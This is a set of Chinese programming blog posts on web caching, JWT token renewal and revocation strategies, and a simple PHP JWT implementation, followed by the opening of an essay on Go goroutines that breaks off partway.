    <url>/2019/coding/web-cache-usage.html</url>
    <content><![CDATA[<h2 id="1-什么是Cache？"><a href="#1-什么是Cache？" class="headerlink" title="1.什么是Cache？"></a>1.什么是Cache？</h2><p>Cache(音: 侃屎),中文称为缓存，缓存可以说是计算机系统里面一味良药，在很多地方的设计都用到了Cache，比如在CPU里面的一级缓存，二级缓存，好的CPU还有三级缓存。硬盘也有缓存，比如一般1T的机械硬盘会有64M的闪存缓存。</p>
<p><img src="/images/2020-03-03.jpg" alt=""></p>
<p>在软件系统里面，缓存更是无处不在，比如浏览器本地缓存、网络缓存、CDN缓存、代理缓存…</p>
<a id="more"></a>

<p>缓存是一种设计思想，在现实生活中也有很多应用，比如京东物流，大家都知道在京东上面买东西快递非常快，那是因为京东在很多大城市的周围建立了自己的仓库，京东把销量比较好的商品提前放在仓库里面。当你下单的时候京东直接从附近的仓库给你发货，速度当然快，最快的情况下几个小时就可以收货。</p>
<p>如果不这样做，直接从厂家发货，比如你在北京，买的东西是从广东生产的，估计至少要2-3天！</p>
<h2 id="2-Cache解决的是什么问题？"><a href="#2-Cache解决的是什么问题？" class="headerlink" title="2.Cache解决的是什么问题？"></a>2.Cache解决的是什么问题？</h2><p>Cache主要解决数据获取成本高的问题,当你获取一个数据特别麻烦，成本非常高，这里的成本高可能是时间成本，比如网络请求时间，或者是验证问题，并且这个数据是重复的，多次获取的数据完全一样，那你就可以使用缓存。</p>
<p>在软件开发中，最常见的用法就是用来替代关系型数据库某些功能，比如在一个电商网站里面，一个商品的数据一旦上架之后很少改动，正常情况下，用户每次刷新页面都需要从数据库多个表里面获取同样的商品数据，如果网站用户非常多，这对数据库压力还是很大的，这时候就可以使用缓存，把每个商品的数据缓存起来，关于缓存在哪里这个问题咱们待会再说。</p>
<blockquote>
<p>最常见的做法就是以key-value的形式缓存数据，比如在上面的例子里面，以商品ID为key，商品信息为value。缓存一方面是为了降低数据库压力，这样就不用每次都查询数据库了，而且还可以提高网站速度，因为很多缓存是存储在内存里面的，这比磁盘的响应和读取速度高很多数量级。</p>
</blockquote>
<p>比如浏览器缓存，很多浏览器都会缓存网站的资源文件，比如图片,js,css,fonts，这样我们就不用每次去网站获取，提高了网页加载速度之外还节省了流量！</p>
<p>在很多数据变化不大，或者对数据时效性要求不高的地方我们都可以使用缓存来提供应用速度，比如接口缓存，假如我们需要调用一个外部接口获取一些数据，但是这个接口比较慢而我们又需要重复去获取这些数据，这时候也可以加缓存。但是缓存并不是银弹，缓存用的不好也会带来一些数据错乱问题，影响系统功能。</p>
<h2 id="3-Cache时效问题"><a href="#3-Cache时效问题" class="headerlink" title="3.Cache时效问题"></a>3.Cache时效问题</h2><p>缓存时效是使用缓存最需要解决的问题，比如上面说到的商品信息缓存，虽然这个商品信息并不是经常改动，但是万一改动了呢？这就会带来数据不一致问题。解决这个问题有2种相对简单的方法，一种是给缓存设置一个有效期，比如说缓存10分钟，10分钟之后缓存就会失效，然后重新从数据库查询数据重新设置缓存。</p>
<p>这样即使数据不一致，也最多只会影响10分钟，这在一些对数据时效性要求不高的应用里面也可以接受，主要是操作简单。</p>
<p>另一种方式则是在修改数据的时候主动更新缓存，这在方式虽然保证了缓存是最新的，但是操作起来并不简单，一个系统里面可能有多个修改数据的入口，如果某一个地方忘记更新缓存…。为了解决这个问题，有些人采用监控数据库binlog日志的方法来更新缓存，因为无论你通过什么方法修改数据，最终都要操作数据库，这样做虽然有效，但是明显更复杂。</p>
<p>当然我们也可以结合这2种方式，既给缓存设置一定的有效期，也在修改数据的时候更新缓存，这样即使忘记更新缓存，也能保证数据最终会一致。</p>
<img src = "/images/old/5f6e3e27ly1fymbog7e6zj20i707m0tf.jpg" />

<p>在http协议里面，缓存是非常重要的，为了解决缓存时效性问题，协议定义了很多header，比如 Expires、Cache-Control、Last-Modified、If-Modified-Since、Etag，具体含义和用法这里不过多解释，但是这些协议头只是约定了一些规则，具体怎么实现还得看web服务器以及中间的代理服务器，其最终目的都是为了既能充分利用浏览器缓存提供网页加载速度，也能及时获取最新数据。</p>
<h2 id="4-缓存分类"><a href="#4-缓存分类" class="headerlink" title="4.缓存分类"></a>4.缓存分类</h2><p>如果从客户端到服务器中间的过程来分，缓存一般分为这几种：</p>
<h3 id="1-客户端缓存。"><a href="#1-客户端缓存。" class="headerlink" title="1.客户端缓存。"></a>1.客户端缓存。</h3><p>这个最常见的就是浏览器缓存，除此之外，其它很多手机App，客户端App理论上讲都可以使用缓存。</p>
<h3 id="2-代理服务器缓存"><a href="#2-代理服务器缓存" class="headerlink" title="2.代理服务器缓存"></a>2.代理服务器缓存</h3><p>最常见的就是各种CDN缓存。有些公司或者企业内部可能也有自己的缓存服务器。还有一些第三方宽带运营商，比如长城宽带，宽带通这类一般内部都有自己的缓存服务器，因为这些宽带服务商的的流量需要向电信、联通购买，如果它们内部能够缓存常用的资源，就可以大大节省流量开销，这也是为什么这些宽带便宜的原因之一。</p>
<h3 id="3-服务器缓存"><a href="#3-服务器缓存" class="headerlink" title="3.服务器缓存"></a>3.服务器缓存</h3><p>一个请求如果在客户端本地，中间代理服务器都没有找到缓存的资源，它就会到达最终服务器，我们一般说的 memcached，redis缓存就是指服务器缓存。服务器缓存根据类型的不同也可以分好几种：<br><img src = "/images/old/5f6e3e27ly1fymcn95eewj20ha09174r.jpg" /></p>
<h4 id="一-本地缓存"><a href="#一-本地缓存" class="headerlink" title="一.本地缓存"></a>一.本地缓存</h4><p>顾名思义，就是指我们把数据缓存在服务器本地，可细分为文件缓存和内存缓存，文件缓存一般适合少量数据，操作简单，读取速度一般，自带持久化，不会比数据库快很多。内存缓存是把数据存储在服务器内存里面，和内存一样，只要Web服务不重启，数据就不会丢失，和文件缓存比，内存缓存要快很多。</p>
<p>但是如果你有多台Web服务器并且做了负载均衡，使用本地缓存可能会带来数据不一致问题，更新起来更麻烦，一般很少用。</p>
<h4 id="二-远程缓存"><a href="#二-远程缓存" class="headerlink" title="二.远程缓存"></a>二.远程缓存</h4><p>这是针对本地缓存而言，所谓远程是指有一个服务器专门提供缓存服务，多台服务器使用同一个缓存服务，这就解决了本地缓存的问题。咱们最常用的memcached和redis就是属于远程内存缓存，其中redis支持持久化。</p>
<h4 id="三-分布式缓存"><a href="#三-分布式缓存" class="headerlink" title="三.分布式缓存"></a>三.分布式缓存</h4><p>这是第二种类型的扩展，这时候我们不仅仅有多台Web服务器，还有多台缓存服务器，这时候我们需要解决缓存服务器之间的数据同步问题！</p>
<h2 id="5-常见内存缓存应用"><a href="#5-常见内存缓存应用" class="headerlink" title="5.常见内存缓存应用"></a>5.常见内存缓存应用</h2><p>通常情况下，我们很少自己去实现缓存服务，往往采用成熟的第三方缓存应用，通常有以下2个：</p>
<h3 id="1-memcached"><a href="#1-memcached" class="headerlink" title="1.memcached"></a>1.memcached</h3><p>功能简单，只支持常用的增删改查操作，只支持string类型，不支持持久化，不支持集群，性能优秀。</p>
<h3 id="2-redis"><a href="#2-redis" class="headerlink" title="2.redis"></a>2.redis</h3><p>基本上可以说memcached有的redis都有，memcached没有的redis也有，redis支持的数据类型非常多，功能强大，而且支持持久化，自带集群功能，社区活跃。所以基本上现在使用redis居多，memcached用来存储session这样的临时数据比较合适。如果只做缓存的话，memcached性能要比redis好那么一丢丢而已，但是redis的功能可不仅仅是缓存。</p>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>Cache</tag>
      </tags>
  </entry>
  <entry>
    <title>JWT Token的刷新和作废</title>
    <url>/2019/coding/jwt-token-usage.html</url>
    <content><![CDATA[<p>之前一篇简单介绍了下JWT的用法,涉及到token的签发和验证。有人说JWT不适合用于替换传统的 <strong>session+cookies</strong> 机制用于Web应用的用户登录状态维护，很大原因就是这块问题。</p>
<p>虽然之前的案例里面，我们可以成功在登录后获取一个Token，然后访问服务器的时候带着这个Token，服务器就可以知道当前访问的用户Uid了，假设现在有一下需求：</p>
<ul>
<li><p>登录后7天不用重复登录</p>
</li>
<li><p>超过30天没有访问网站则需重新登录，否则一直有效</p>
</li>
<li><p>修改密码功能</p>
</li>
</ul>
<a id="more"></a>

<h2 id="Token续签问题"><a href="#Token续签问题" class="headerlink" title="Token续签问题"></a>Token续签问题</h2><p>对于第一个问题，我们可以在jwt的 <strong>Payload</strong> 里面设置一个过期时间，比如说7天，超过这个时间Token无效。但是如果只是简单的这么做的话就会带来另一个问题：<br>假如一个用户正在访问网站，突然Token失效了，用户就会掉登录，体验太差。</p>
<p>所以，大部分时候我们都是采用第二种策略: 超过xx天不访问网站则需要重新登录，如果中间连续访问网站的话则不要重新登录，对于很多手机App，我们可不希望用户天天输账号密码登录，但如果永久有效可能会带来一些安全问题。</p>
<p>这其实就是Token的续签问题，我们看一下网上提到的一些解决方案：</p>
<h3 id="1-更新Payload里面的过期时间。"><a href="#1-更新Payload里面的过期时间。" class="headerlink" title="1.更新Payload里面的过期时间。"></a>1.更新Payload里面的过期时间。</h3><p>JWT的Payload里面可以设置一个过期时间，我们可以在用户每次访问的时候把这个过期时间更新一下。由于JWT的secret加密机制，只要exp变了，整个Token就变了，所以这种机制相当于每次重新颁发了一个新的Token。</p>
<p>这种方案简单粗暴，存在性能问题，还有安全问题，以前的那么多Token咋办？</p>
<h3 id="2-快过期的时候更新Token"><a href="#2-快过期的时候更新Token" class="headerlink" title="2.快过期的时候更新Token"></a>2.快过期的时候更新Token</h3><p>比如说离过期时间还有不到1个小时的时候才更新Token，性能上面可能好一点，但是如果一个用户一直在访问，但是恰好最后一个1个小时内没有访问网站，那岂不是也gg了？</p>
<h3 id="3-使用Cache记录Token过期时间"><a href="#3-使用Cache记录Token过期时间" class="headerlink" title="3.使用Cache记录Token过期时间"></a>3.使用Cache记录Token过期时间</h3><p>Token本身不设置过期时间，然后我们在redis或memcached等缓存里面单独设置一个有效期，每次访问的时候刷新过期时间。</p>
<p>其实这个方案和使用session机制无异，session也可以保存在redis或者memcached里面的。所以，有人戏说这是重新发明了session 。。。</p>
<h3 id="4-使用refreshToken"><a href="#4-使用refreshToken" class="headerlink" title="4.使用refreshToken"></a>4.使用refreshToken</h3><p>借鉴 <strong>oauth2</strong> 的设计，返回给客户端一个 refreshToken，允许客户端主动刷新JWT。一般而言，jwt 的过期时间可以设置为数小时，而 refreshToken 的过期时间设置为数天。<br>我对oauth2不太熟悉，不过很明显这个方案更加复杂了，而且为什么不拿旧的Token去刷新JWT呢？</p>
<h3 id="5-推荐方案"><a href="#5-推荐方案" class="headerlink" title="5.推荐方案"></a>5.推荐方案</h3><p>最后说一下我觉得比较合适的方案，当服务器接受到一个Token后，如果它已经过期，但是已过期的时间在xx天内，比如说30天，我们就返回一个新的Token。比如说Token的有效期是7天，但是如果过期时间不超过30天就可以用旧的Token换取一个新的Token，如果超过了30天那就需要重新登录。</p>
<h2 id="Token作废问题"><a href="#Token作废问题" class="headerlink" title="Token作废问题"></a>Token作废问题</h2><p>当用户退出登录、修改密码之后，讲道理我们是需要作废之前的Token，比如说用户的Token被盗用了，只能通过修改密码来防止账号被盗用。如果使用session机制就很简单了，我们清空服务器session，或者使用新的session替换之前旧的session也行。</p>
<p>由于Token是无状态的，理论上只要不过期就可以一直用，你说这咋办？为了安全，必须得做一些额外的工作！</p>
<h3 id="1-Cache"><a href="#1-Cache" class="headerlink" title="1.Cache"></a>1.Cache</h3><p>如果你之前是采用把Token存在cache里面这种方案，那么你只要删除cache里面的key就可以了。不过如果你真的是采用这种方案，还不如直接用session，这时候的Token和sessionid没区别。</p>
<h3 id="2-用户关联"><a href="#2-用户关联" class="headerlink" title="2.用户关联"></a>2.用户关联</h3><p>有人说，建一张表把uid和Token关联起来，这样一个用户只有一个有效的Token，或者存cache也行，建立uid和Token的一对一关系，这方案和1差不多。无论是存表还存cache，每次访问都必不可免的需要访问库或cache。</p>
<h3 id="3-黑名单"><a href="#3-黑名单" class="headerlink" title="3.黑名单"></a>3.黑名单</h3><p>在数据表或cache里面维护一个黑名单，也避免不了查库或者查cache，为了避免这个库内容过多，可以定期清理数据库，或者给cache设置一个有效期。比如说在上面说的例子里面，有效期应该设置为30天，30天之后就不用管了。</p>
<p>其实我比较喜欢第3种方案，第2种方案如果用户多了对库压力大，而第3种，除非用户经常修改密码或者退出登录，不然这个数据集不会很大。</p>
<p>如果不考虑安全，我们完全可以不考虑Token作废问题，那么我们就必须在防止XSS攻击上面做好工作，比如说使用https，cookies设置httpOnly。。。</p>
<h2 id="是否需要使用JWT-Token？"><a href="#是否需要使用JWT-Token？" class="headerlink" title="是否需要使用JWT Token？"></a>是否需要使用JWT Token？</h2><p>看完之后大家是否发现原来JWT Token并没有那么好用，这也是很多人说的不要采用JWT的原因了: <a href="https://juejin.im/entry/5993a030f265da24941202c2" target="_blank" rel="noopener">讲真，别再使用JWT了！</a>、<a href="https://www.zcfy.cc/article/stop-using-jwt-for-sessions-joepie91s-ramblings" target="_blank" rel="noopener">请停止使用 JWT 认证</a> 。。。</p>
<p>仔细看完这些文章其实大家会发现JWT尤其适合那些一次性验证的应用，比如说有些网站的文件下载为了防止盗链，会在url后面追加一些字符串，这些字符串其实就是Token，它里面可能包含了用户信息和过期时间，你发送给别人下载或者想盗链就非常麻烦了。</p>
<p>至于用不用我觉得还是看需求，你觉得呢？</p>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>JWT</tag>
      </tags>
  </entry>
  <entry>
    <title>Token 和 JWT Token</title>
    <url>/2019/coding/jwt-token-info.html</url>
    <content><![CDATA[<h2 id="1-Token的用途"><a href="#1-Token的用途" class="headerlink" title="1.Token的用途"></a>1.Token的用途</h2><p>在很多计算机系统里面都少不了用户认证这一步骤,最常见的认证就是账号密码认证,也就是注册、登录这一流程。</p>
<p>在现实生活中,人也需要认证,大家应该都有个 <strong>身份证</strong>,回想一下这个身份证是从哪里来的呢?<br>办过身份证的应该都知道,一般情况下,身份证需要本人带着 <strong>户口本</strong> 去 <strong>公安局</strong> (不知道现在改了木有?)办理,工作人员在核对了相关信息,确认无误的情况下会给你颁发一个身份证, <strong>有效期</strong> 一般是10-20年,在一些需要认证的时候,你就可以拿出身份证 <strong>校验</strong> 核对身份,比如买火车票,出国,或者办理其它证件.</p>
<a id="more"></a>

<p>很多Web系统里面token就类似于身份证,账号密码就相当于咱的户口本和本人,需要核对账号密码后获取,拿到token之后就可以使用一些需要认证的服务,而且token也有有效期，和身份证一样,理论上token必须是唯一。</p>
<h2 id="2-常见的Web认证方式"><a href="#2-常见的Web认证方式" class="headerlink" title="2.常见的Web认证方式"></a>2.常见的Web认证方式</h2><h3 id="1-HTTP-Basic-Auth"><a href="#1-HTTP-Basic-Auth" class="headerlink" title="1.HTTP Basic Auth"></a>1.HTTP Basic Auth</h3><p>这种方式在早期一些Web系统比较常见，就是那种在浏览器弹出一个框让你输账号密码那种，简单易用，但是缺点一个不安全，其账号密码其实是明文（base64encode）传输的，而且每次都得带上。另外就是太丑了。。。</p>
<img src = "/images/old/5f6e3e27ly1fz041egnonj20ci08sgmf.jpg" />


<h3 id="2-Cookies-Session"><a href="#2-Cookies-Session" class="headerlink" title="2.Cookies\Session"></a>2.Cookies\Session</h3><p>这种认证方式其实就是类似我们最开始说的身份证这种，只需要输入一次账号密码，认证成功后，系统会将用户信息存入<strong>session</strong>，session是服务器的本地存储功能，然后系统根据session生成一个唯一的 <strong>sessionid</strong> 以cookies的形式发送给浏览器。</p>
<p><strong>cookies</strong>是浏览器本地存储，在这套机制里面的作用是用来存储sessionid，你也可以不使用cookies存储，早期有些网站在一些不支持cookies的浏览器上面会把sessionid追加到url上面。</p>
<p>cookies里面存储的sessionid其实就是相当于身份证编号，每次访问网站里面我们带着这个编号，服务器拿着编号就可以找到对应的session里面存储的信息，一般情况下里面会存储一些用户信息，比如uid。</p>
<img src = "/images/old/5f6e3e27ly1fz04jhi9wij20lr03v74q.jpg" />

<p>讲道理这套机制其实问题并不大，大部分时候都管用，但是cookies有一个毛病就是无法跨域，很多大公司有很多网站，这些网站域名可能还不一样。而且cookies对现在的手机APP支持不好，原生并不支持cookies。最后，就是服务器存储session也需要一些开销，特别是用户特别多的情况下。还有其它缺点这里就不列出来了，很多文章都有写到。</p>
<p>但是其实我想说这套机制大部分情况下是够用的，特别是对于一些中小型网站来说，简单易用，快速开发。</p>
<h3 id="3-JWT"><a href="#3-JWT" class="headerlink" title="3.JWT"></a>3.JWT</h3><p>一般说到JWT都会提到token，在我的理解里面token其实就是一个字符串，它可以是jwt token，也可以是sessionid token，token就是是一个携带认证信息的字符串。</p>
<p>网上关于介绍JWT的文章特别多，大同小异，我们这里也懒的再说一遍了，贴一个大神的教程，我觉得讲的挺清晰了，<a href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">JSON Web Token 入门教程</a>。</p>
<p>简单的说，JWT本质上是一种解决方案标准，该方案下一个token应该有3部分组成: <strong>Header、Payload、Signature</strong>, 其中前2部分差不多就是明文的，都是<strong>json</strong> 对象，里面存了一些信息，使用 <strong>base64urlencode</strong> 编码成一个字符串。最后的 <strong>Signature</strong> 是前面2个元素和<strong>secret</strong>一起加密之后的结果,加密算法默认是 <strong>SHA256</strong>, 这个<strong>secret</strong>应该只有服务器知道，解密的时候需要用到。</p>
<p>最后生成的token是一个比较长的字符串，当用户登录成功之后可以把这个串返回给浏览器，浏览器下次请求的时候带着这个串就行了，问题来了，怎么带？很多文章说放到cookies里面，讲道理放到cookies里面那和sessionid有啥区别？ 标准做法是放到HTTP请求的头信息Authorization字段里面。</p>
<p>服务器拿到这个串，首先把前面2段的Header和Payload使用 <strong>base64urldecode</strong> 解码出来，然后使用刚才使用的加密算法和secret校验一下是否和第3段的signature一样，如果不一样，则说明这个Token是伪造的，如果一样，就可以相信Payload里面的信息了，一般Payload里面会存放一些用户信息，比如uid，如果Payload里面需要存放一些敏感信息，比如手机号，建议先加密Payload。</p>
<h3 id="PHP实战"><a href="#PHP实战" class="headerlink" title="PHP实战"></a>PHP实战</h3><p>下面我将使用PHP构建一个简单的例子：</p>
<h4 id="JWT类："><a href="#JWT类：" class="headerlink" title="JWT类："></a>JWT类：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jwt</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $alg = <span class="string">'sha256'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $secret = <span class="string">"123456"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * alg属性表示签名的算法（algorithm），默认是 HMAC SHA256（写成 HS256）；typ属性表示这个令牌（token）的类型（type），JWT 令牌统一写为JWT</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHeader</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $header = [</span><br><span class="line">            <span class="string">'alg'</span> =&gt; <span class="keyword">$this</span>-&gt;alg,</span><br><span class="line">            <span class="string">'typ'</span> =&gt; <span class="string">'JWT'</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;base64urlEncode(json_encode($header, JSON_UNESCAPED_UNICODE));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用，这里可以存放私有信息，比如uid</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $uid int 用户id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPayload</span><span class="params">($uid)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $payload = [</span><br><span class="line">            <span class="string">'iss'</span> =&gt; <span class="string">'admin'</span>, <span class="comment">//签发人</span></span><br><span class="line">            <span class="string">'exp'</span> =&gt; time() + <span class="number">600</span>, <span class="comment">//过期时间</span></span><br><span class="line">            <span class="string">'sub'</span> =&gt; <span class="string">'test'</span>, <span class="comment">//主题</span></span><br><span class="line">            <span class="string">'aud'</span> =&gt; <span class="string">'every'</span>, <span class="comment">//受众</span></span><br><span class="line">            <span class="string">'nbf'</span> =&gt; time(), <span class="comment">//生效时间</span></span><br><span class="line">            <span class="string">'iat'</span> =&gt; time(), <span class="comment">//签发时间</span></span><br><span class="line">            <span class="string">'jti'</span> =&gt; <span class="number">10001</span>, <span class="comment">//编号</span></span><br><span class="line">            <span class="string">'uid'</span> =&gt; $uid, <span class="comment">//私有信息，uid</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;base64urlEncode(json_encode($payload, JSON_UNESCAPED_UNICODE));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成token,假设现在payload里面只存一个uid</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $uid int</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">genToken</span><span class="params">($uid)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $header  = <span class="keyword">$this</span>-&gt;getHeader();</span><br><span class="line">        $payload = <span class="keyword">$this</span>-&gt;getPayload($uid);</span><br><span class="line"></span><br><span class="line">        $raw   = $header . <span class="string">'.'</span> . $payload;</span><br><span class="line">        $token = $raw . <span class="string">'.'</span> . hash_hmac(<span class="keyword">$this</span>-&gt;alg, $raw, <span class="keyword">$this</span>-&gt;secret);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解密校验token,成功的话返回uid</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $token</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verifyToken</span><span class="params">($token)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!$token) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $tokenArr = explode(<span class="string">'.'</span>, $token);</span><br><span class="line">        <span class="keyword">if</span> (count($tokenArr) != <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $header    = $tokenArr[<span class="number">0</span>];</span><br><span class="line">        $payload   = $tokenArr[<span class="number">1</span>];</span><br><span class="line">        $signature = $tokenArr[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        $payloadArr = json_decode(<span class="keyword">$this</span>-&gt;base64urlDecode($payload), <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!$payloadArr) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//已过期</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($payloadArr[<span class="string">'exp'</span>]) &amp;&amp; $payloadArr[<span class="string">'exp'</span>] &lt; time()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $expected = hash_hmac(<span class="keyword">$this</span>-&gt;alg, $header . <span class="string">'.'</span> . $payload, <span class="keyword">$this</span>-&gt;secret);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//签名不对</span></span><br><span class="line">        <span class="keyword">if</span> ($expected !== $signature) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $payloadArr[<span class="string">'uid'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 安全的base64 url编码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">base64urlEncode</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> rtrim(strtr(base64_encode($data), <span class="string">'+/'</span>, <span class="string">'-_'</span>), <span class="string">'='</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 安全的base64 url解码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool|string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">base64urlDecode</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> base64_decode(str_pad(strtr($data, <span class="string">'-_'</span>, <span class="string">'+/'</span>), strlen($data) % <span class="number">4</span>, <span class="string">'='</span>, STR_PAD_RIGHT));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$jwt = <span class="keyword">new</span> \App\Jwt();</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取token</span></span><br><span class="line">$token = $jwt-&gt;genToken(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//解密token</span></span><br><span class="line">$uid = $jwt-&gt;verifyToken($token);</span><br><span class="line"></span><br><span class="line">var_dump($uid);</span><br></pre></td></tr></table></figure>
<p>以上代码仅供参考，实际应用的话最好找个现成的库，不推荐重复造轮子，jwt的思想是通用的，不分语言，github上面有很多。。。这里贴一个PHP的库: <a href="https://github.com/firebase/php-jwt" target="_blank" rel="noopener">firebase/php-jwt</a>。</p>
<p>最后再说说session和jwt的选择问题，网上随便搜搜就可以看到很多文章比较这2者优劣，总结就是各有利弊，实际上很多公司既不是session，也不是jwt，可能就是自己搞的类似jwt token这样的一个字符串，然后放在cookies里面，只要这个串能够代表一个用户都可以。</p>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>JWT</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈Golang协程</title>
    <url>/2018/coding/golang/goroutine.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习和使用golang也有一段时间了，golang最近2年在国内很火，提起golang和其它语言最大区别莫过于协程，不过咱今天先不说协程，我先说一下自己的一些理解。</p>
<p>对c熟悉的人应该对go不陌生，它们都属于强类型静态编译型语言，在语法上和PHP这种弱类型动态解释型语言不一样，虽然差异很大，但是基本语法都是差不多，掌握一种语言之后再去学其它语言语法不是什么大问题。</p>
<p>在IT行业，编程语言之争一直是个很热闹的话题，编程语言之间的区别不仅仅在于语法和特性，语法只是表达编程思想的方式，一个编程语言的背后往往是其强大的生态圈，比如c语言之所以经久不衰，那是因为它几乎可以认为是创世纪语言，是当代编程的起点，而PHP则以快速处理文本，快速搭建web网站出名，JS则是浏览器编程的唯一选择，Python拥有的科学计算库是其它语言没有的。</p>
<p>说到go的优点，一般都集中在静态编译、毫秒级GC、简洁、并发并行等特性上面，go是2008年诞生的，由C语言之父设计，相对其它语言来说比较年轻，可以说在设计之初吸收了各大语言的优点。</p>
<a id="more"></a>

<h2 id="协程到底是什么东西？"><a href="#协程到底是什么东西？" class="headerlink" title="协程到底是什么东西？"></a>协程到底是什么东西？</h2><p>说到go必须得说协程，先说说为什么需要协程，都说go是为并发编程而生，指的就是go很容易写出高并发的程序，现代计算机硬件早已步入多核时代，前段时间AMD刚刚发布最新的锐龙3代，作为民用级的CPU现在已达到16核32线程，然而大部分编程语言依然弱智，只能利用单核性能，传说中一核有难多核围观…</p>
<p>但是操作系统提供了多进程的能力，除了多进程之外，还有一个叫多线程，线程和进程区别不大，线程是程序执行的最小单位,一个进程可以有多个线程，编程语言可以使用多进程或多线程利用多核CPU的能力，然而现实并不是那么简单…</p>
<p>进程和线程都可以解决多核CPU利用率的问题，比如PHP就整出来一个fpm，采用了master-worker模型，实际上采用多进程解决并发问题，已经非常不错了，但是依然存在问题，支持不了太高的并发。</p>
